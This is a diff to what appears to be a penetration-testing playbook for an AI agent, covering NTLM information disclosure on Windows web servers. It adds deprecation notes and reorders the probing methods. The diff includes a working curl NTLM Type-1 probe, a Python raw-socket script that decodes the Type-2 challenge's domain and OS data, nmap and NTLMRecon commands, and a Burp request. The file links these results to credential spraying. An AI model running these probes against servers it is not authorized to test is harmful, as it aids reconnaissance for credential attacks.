@@ -22,6 +22,10 @@ NTLM info disclosure is a **Medium-severity finding when chained to context** �
 - Timestamp leak (used in NTLMv2 hash cracking acceleration)
 - Direct attack-map enrichment for credential spraying combined with `hunt-auth-bypass` Legacy-Protocol Matrix
 
+**Deprecation context (useful in the remediation section):**
+- Microsoft lists **all NTLM versions** (LANMAN, NTLMv1, NTLMv2) as deprecated since **June 2024**, and **NTLMv1 is removed** starting in Windows 11 24H2 and Windows Server 2025 ([Deprecated features in Windows](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features); [NTLMv1 changes](https://support.microsoft.com/topic/upcoming-changes-to-ntlmv1-in-windows-11-version-24h2-and-windows-server-2025-c0554217-cdbc-420f-b47c-e02b2db49b2e)).
+- Microsoft's Jan 2026 plan ([Disabling NTLM by default](https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526)) disables network NTLM by default only in a **future** Windows release; in-market Windows and Windows Server keep supporting it. Expect internet-facing IIS / Exchange / SharePoint to keep emitting Type-2 challenges for years, and cite the deprecation when recommending Kerberos-only or Forms-only bindings.
+
 ---
 
 ## Attack Surface Signals
@@ -67,10 +71,13 @@ WWW-Authenticate: Negotiate, NTLM
    ```
    This is the standard test Type-1 with negotiate flags `NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_OEM | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_ALWAYS_SIGN | NTLMSSP_NEGOTIATE_KEY_EXCH | NTLMSSP_NEGOTIATE_56 | NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_TARGET_INFO`. The `OS Version` field (`06 01 B1 1D 00 00 00 0F`) is Windows 7 build 7601 — accepted by virtually every NTLM responder.
 
-3. **Use a keep-alive raw socket, not Python requests / curl one-shot.** Most HTTP libraries close the connection between the Type-1 send and Type-2 reception. Use one of:
-   - Burp Repeater with `Connection: keep-alive` set explicitly
-   - Burp `mcp__burp__send_http1_request` (handles keep-alive natively)
-   - Python raw `socket` + `ssl.wrap_socket` (see Payload section)
+3. **Use a keep-alive raw socket, not Python requests / curl one-shot.** Most HTTP libraries close the connection between the Type-1 send and Type-2 reception. In order of preference:
+   - **Primary:** the Python raw `socket` + `SSLContext.wrap_socket` script in the Payload section. No proxy or MCP needed; it decodes the AV_PAIRS in the same run.
+   - **Tool cross-check:** nmap NSE `http-ntlm-info` or NTLMRecon (Payload section), which also scale to many hosts.
+   - Burp Repeater with `Connection: keep-alive` set explicitly.
+   - Burp MCP `send_http1_request`, **only when the Burp MCP is connected**. It is often unavailable, so never make it the only path.
+
+   **Negotiate-only endpoints.** If the server advertises only `WWW-Authenticate: Negotiate`, send the same Type-1 as `Authorization: Negotiate <base64>`; servers that still allow NTLM usually answer with `WWW-Authenticate: Negotiate <Type-2>`. A Kerberos-only server (NTLM disabled, increasingly common as NTLM is phased out) never returns a Type-2: record that as a negative, not a finding.
 
 4. **Parse the Type-2 challenge from the `WWW-Authenticate: NTLM <base64>` response header.** Base64-decode the value. The structure is NTLMSSP per MS-NLMP:
    - Bytes 0-7: literal `NTLMSSP\0`
@@ -104,7 +111,7 @@ WWW-Authenticate: Negotiate, NTLM
 
 ## Payload & Detection Patterns
 
-**Generic NTLM Type-1 anonymous probe (curl + raw socket fallback):**
+**Generic NTLM Type-1 anonymous probe (curl quick check only):**
 ```bash
 # Most one-shot curl runs DON'T return Type-2 because the connection closes.
 # Use this as a quick probe to confirm NTLM is offered:
@@ -112,17 +119,7 @@ curl -sk -I -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAG
   "https://target.example/_api/web/CurrentUser" 2>&1 | grep -i "WWW-Authenticate"
 ```
 
-**Burp `send_http1_request` (recommended for full Type-2 capture):**
-```
-GET /_api/web/CurrentUser HTTP/1.1
-Host: target.example
-Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
-Connection: keep-alive
-User-Agent: Mozilla/5.0
-
-```
-
-**Python raw socket + AV_PAIR decoder:**
+**Python raw socket + AV_PAIR decoder (primary path):**
 ```python
 import socket, ssl, base64, struct, re
 from datetime import datetime, timezone
@@ -146,7 +143,7 @@ while True:
     data += chunk
     if b"\r\n\r\n" in data: break
 
-m = re.search(rb"WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]{20,})", data, re.I)
+m = re.search(rb"WWW-Authenticate:\s*(?:NTLM|Negotiate)\s+([A-Za-z0-9+/=]{20,})", data, re.I)
 if m:
     b = base64.b64decode(m.group(1).decode("ascii"))
     assert b[:8] == b"NTLMSSP\x00"
@@ -170,6 +167,24 @@ if m:
             vs = val.decode('utf-16-le', errors='ignore')
         print(f"  AV[{av_id}] {av_types.get(av_id, '?'):28s}: {vs!r}")
         i += 4 + av_len
+```
+
+**Tool cross-check (no Burp needed):**
+```bash
+# nmap NSE — sends a null-credential NTLM request and decodes NetBIOS / DNS / OS build
+nmap -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/_api/web/CurrentUser target.example
+# NTLMRecon (github.com/pwnfoo/NTLMRecon) — finds NTLM-enabled paths and writes domain / server / FQDN to CSV
+ntlmrecon --input https://target.example --outfile ntlmrecon.csv
+```
+
+**Burp `send_http1_request` (optional, only when the Burp MCP is connected):**
+```
+GET /_api/web/CurrentUser HTTP/1.1
+Host: target.example
+Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
+Connection: keep-alive
+User-Agent: Mozilla/5.0
+
 ```
 
 **Burp Collaborator NOT needed** for this finding class — the data leak is in the synchronous response, not via OOB.
